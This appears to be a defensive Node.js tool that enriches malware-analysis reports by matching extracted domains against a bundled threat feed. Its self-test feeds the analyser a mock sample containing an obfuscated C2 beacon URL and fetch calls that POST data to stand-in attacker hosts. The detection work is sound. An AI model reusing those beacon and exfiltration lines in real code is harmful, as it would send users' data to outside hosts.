#!/usr/bin/env node
/**
 * Threat-Intel Enricher — offline IOC enrichment for analysis reports.
 * Matches extracted domains/URLs against a bundled feed and scores risk.
 */
import { readFile } from 'node:fs/promises'
import { analyzeSample } from '../../../tools/index.js'

export const FEED = Object.freeze({
  'c2.example.test': { family: 'HELIOS', confidence: 0.92, tags: ['banking', 'webinject'] },
  'collect.example.net': { family: 'MAGEPAY', confidence: 0.88, tags: ['skimmer'] },
  'pool.example.test': { family: 'HASHMINE', confidence: 0.81, tags: ['cryptominer'] },
  'api.telegram.org': { family: 'TELEBOT', confidence: 0.7, tags: ['c2', 'telegram'] },
  'discord.com': { family: 'DISCORDHOOK', confidence: 0.65, tags: ['c2', 'webhook'] },
  'unknown.example.test': { family: null, confidence: 0.1, tags: ['unknown'] },
})

const TRUSTED = new Set(['example.com', 'example.org', 'example.net'])

function hostOf(value) {
  try {
    return new URL(value).hostname.toLowerCase()
  } catch {
    return String(value).toLowerCase()
  }
}

/** @param {object} report @param {object} [feed] */
export function enrichReport(report, feed = FEED) {
  const urls = (report.static?.iocs?.urls ?? []).map((entry) => entry.value ?? entry)
  const domains = new Set(urls.map(hostOf))
  for (const entry of report.static?.iocs?.domains ?? []) domains.add(hostOf(entry.value ?? entry))
  const hits = []
  for (const domain of domains) {
    const intel = feed[domain]
    if (intel) {
      hits.push({ domain, ...intel, reputation: intel.confidence >= 0.8 ? 'malicious' : intel.family ? 'suspicious' : 'unknown' })
      continue
    }
    const parent = domain.split('.').slice(-2).join('.')
    if (feed[parent]) hits.push({ domain, ...feed[parent], reputation: 'malicious' })
    else if (TRUSTED.has(parent)) hits.push({ domain, family: null, confidence: 0.05, tags: ['trusted'], reputation: 'trusted' })
    else hits.push({ domain, family: null, confidence: 0.2, tags: ['unrated'], reputation: 'unknown' })
  }
  hits.sort((a, b) => b.confidence - a.confidence || a.domain.localeCompare(b.domain))
  const known = hits.filter((hit) => hit.family)
  return {
    hits,
    families: [...new Set(known.map((hit) => hit.family))],
    maxConfidence: hits.reduce((max, hit) => Math.max(max, hit.confidence), 0),
    known: known.length,
    unknown: hits.filter((hit) => !hit.family).length,
  }
}

async function selfTest() {
  const sample = [
    'var url = atob("aHR0cHM6Ly9jMi5leGFtcGxlLnRlc3QvYmVhY29u");',
    'fetch(url, { method: "POST", body: "x" }).catch(function(){});',
    'fetch("https://collect.example.net/forms", { method: "POST", body: "y" }).catch(function(){});',
    'fetch("https://unknown.example.test/x").catch(function(){});',
  ].join('\n')
  const result = await analyzeSample(sample, { name: 'enrich.js', logLevel: 'silent', network: { policy: 'deny' } })
  const enrichment = enrichReport(result.report)
  if (enrichment.known < 2) throw new Error(`expected known intel, got ${JSON.stringify(enrichment.hits)}`)
  if (!enrichment.families.includes('HELIOS') || !enrichment.families.includes('MAGEPAY')) throw new Error('family mapping failed')
  if (enrichment.maxConfidence < 0.8) throw new Error('confidence scoring failed')
  if (!enrichment.hits.some((hit) => hit.reputation === 'unknown')) throw new Error('unknown classification missing')
  console.log(`enrichment: known=${enrichment.known} unknown=${enrichment.unknown} families=${enrichment.families.join(',')}`)
  console.log('SELFTEST OK')
}

async function main() {
  if (process.argv.includes('--self-test')) return selfTest()
  if (process.argv.includes('--help') || !process.argv[2]) {
    console.log('Threat-Intel Enricher\n  <file> [--json]\n  --self-test')
    if (!process.argv[2]) process.exitCode = 2
    return
  }
  const file = process.argv[2]
  const source = await readFile(file, 'utf8')
  const result = await analyzeSample(source, { name: file, logLevel: 'silent', network: { policy: 'deny' } })
  const enrichment = enrichReport(result.report)
  if (process.argv.includes('--json')) {
    console.log(JSON.stringify(enrichment, null, 2))
    return
  }
  for (const hit of enrichment.hits) {
    console.log(`${hit.reputation.padEnd(10)} ${String(hit.confidence).padEnd(5)} ${hit.domain.padEnd(32)} ${(hit.family ?? '-').padEnd(10)} ${hit.tags.join(',')}`)
  }
  console.log(`families: ${enrichment.families.join(', ') || 'none'}`)
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((error) => {
    console.error(`error: ${error.message}`)
    process.exitCode = 1
  })
}
